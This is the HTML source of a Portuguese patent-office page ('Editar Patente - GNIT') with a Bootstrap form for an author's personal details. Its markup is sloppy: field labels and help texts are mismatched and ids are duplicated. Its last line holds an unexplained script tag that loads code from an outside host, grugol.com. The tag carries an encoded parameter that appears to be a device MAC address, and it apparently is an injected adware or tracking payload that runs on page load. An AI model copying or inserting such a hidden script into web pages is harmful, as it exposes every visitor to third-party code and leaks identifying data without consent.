<html lang="pt-BR">
	<head>
        
		<meta charset="UTF-8" />
		<title> Editar Patente - GNIT </title>
        <meta charset="UTF-8">
	   
		<!--Os arquivos Meta-->
		<meta name="viewport" content="width=device-width,initial-scale=1.0">
		<meta name="description" content"Espaço NIT">
		<meta name="author" content="">
		<!--Fim dos arquivos Meta-->
		
		<!--Os Arquivos CSS-->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
		<link href="css/template.css" rel="stylesheet">


		<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
		<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

	</head>
	<body>
	
	<!-- Modal -->
<div class="modal fade" id="edition-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="modalLabel">Cancelar edição</h4>
      </div>
      <div class="modal-body">
        Deseja realmente cancelar essa edição?
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary">Sim</button>
	<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
      </div>
    </div>
  </div>
</div>

<nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="quem.php">Quem Somos</a></li>
            <li class="active"><a href="contato.php">Contato</a></li
           </ul>
          <ul class="nav navbar-nav navbar-right">
            
            
          
            
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav> <!--Final da NavBar-->
	

    <div class="container-fluid" style="margin-top:80px;">
      <div class="row">
        <div class="col-md-2" id="menu-esquerdo">
          <p><img src="img/nit.jpg" style="margin-left:15px"></p>
          <ul class="nav nav-pills nav-stacked">
            <li role="presentation" ><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
            <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
            <li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
            <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
            <li role="presentation"><a href="login.php"><img src="img/sair.png"> Sair</a></li>
          </ul>
        </div> <!--Final Menu Esquerdo-->
  <div class="col-md-10">
       <form class="form-horizontal">
          <fieldset>

           
            <legend style="text-align:center;">Autor 01</legend>


            <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Nome:</label>  
              <div class="col-md-4">
                <input id="textinput" name="textinput" type="text" placeholder="nome" required="true" class="form-control input-md">
                <span class="help-block">Nome do Autor</span>  
              </div>
            </div>


            <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Nacionalidade:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="nacionalidade" required="true" class="form-control input-md">
              <span class="help-block">Senha</span>  
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">CPF:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="CPF" required="true" class="form-control input-md">
              <span class="help-block">CPF sem pontos e traços</span>  
              </div>
            </div>

            

            <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Qualificação Física</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Qualificação Física" required="true" class="form-control input-md">
              <span class="help-block">Qualificação Física</span>  
              </div>
            </div>

           
            
            <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Endereço:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
              <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Cidade</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
                        <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Endereço:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
                        <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Estado:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
              <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">CEP</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
              <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">País:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
                        <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Telefone:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
                        <div class="form-group">
              <label class="col-md-4 control-label" for="textinput">Fax:</label>  
              <div class="col-md-4">
              <input id="textinput" name="textinput" type="text" placeholder="Telefone do usuário" required="true" class="form-control input-md">
              <span class="help-block">com DDD, sem parênteses</span>  
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="passwordinput">E-mail</label>
              <div class="col-md-4"> <input id="passwordinput" name="passwordinput" type="email" placeholder="para entrar no sistema" required="true" class="form-control input-md">
                   <span class="help-block">E-mail do usuário</span>  
              </div>
            </div>


            <div class="form-group">
              <label class="col-md-4 control-label" for="button1id"></label>
              <div class="col-md-8">
                <button id="button1id" name="button1id" class="btn btn-success">enviar</button>
                <button id="" name="" class="btn btn-inverse">cancelar</button>
              </div>
            </div>


      </fieldset>
    </form>
  </div> 

        </div>
   

<hr>

  <div class="row">
    <div class="col-md-12">
      <footer>
       <h3>&copy GNIT - Todos os Direitos Reservados</h3>
      </footer>
    </div>
  </div>

 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script></body>
</body>
</html>

</html>